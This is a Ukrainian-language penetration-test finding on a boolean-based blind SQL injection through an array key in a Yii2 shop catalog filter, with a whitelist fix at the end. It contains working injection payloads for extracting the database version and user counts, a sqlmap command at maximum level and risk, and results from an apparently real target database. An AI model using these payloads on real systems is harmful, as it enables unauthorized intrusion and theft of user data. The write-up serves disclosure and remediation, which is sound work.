# 02 — SQL Injection (Boolean-Based Blind)

## Де знайшли
`/shop/catalog/novetly?filter[8][490]=1`

## Виявлення

GET /shop/catalog/novetly?filter[8][490]=1 → 200 OK
GET /shop/catalog/novetly?filter[8][490']=1 → 500 Database Exception
GET /shop/catalog/novetly?filter[8][490 AND 1=1]=1 → 200
GET /shop/catalog/novetly?filter[8][490 AND 1=2]=1 → 500


## Чому вразливо

Yii2 параметризує **значення**, але **ключ масиву** конкатенується напряму:

```php
// Приблизна вразлива логіка
$key = key($_GET['filter'][8]);           // "490 AND 1=1" — не санується
$sql = "WHERE filter_id = " . $key;      // конкатенація в SQL
$db->query($sql, [$value]);              // значення захищене, ключ — ні
```

## Boolean Blind — витяг даних посимвольно

```sql
-- Версія БД
filter[8][490 AND SUBSTRING((SELECT version()),1,1)='8']=1  → 200 ✓

-- Кількість юзерів
filter[8][490 AND (SELECT COUNT(*) FROM users) > 1000000]=1 → 200 ✓

-- Автоматизація
sqlmap -u "https://target.com/shop/catalog/novetly?filter[8][490]=1" \
  --level=5 --risk=3 --technique=B --dbms=mysql -p "filter[8]"
```

## Результат

| | |
|---|---|
| СУБД | Percona MySQL 8.4.3 |
| БД | `ishop` |
| Рядків у `users` | ~7 876 914 |

> Повна виємка boolean blind = 99 років → потрібен інший канал.

## Захист

```php
// ✅ Whitelist для ключів фільтру
$allowedKeys = [490, 491, 492];
$key = (int) key($_GET['filter'][8]);
if (!in_array($key, $allowedKeys, true)) {
    throw new InvalidArgumentException();
}
```
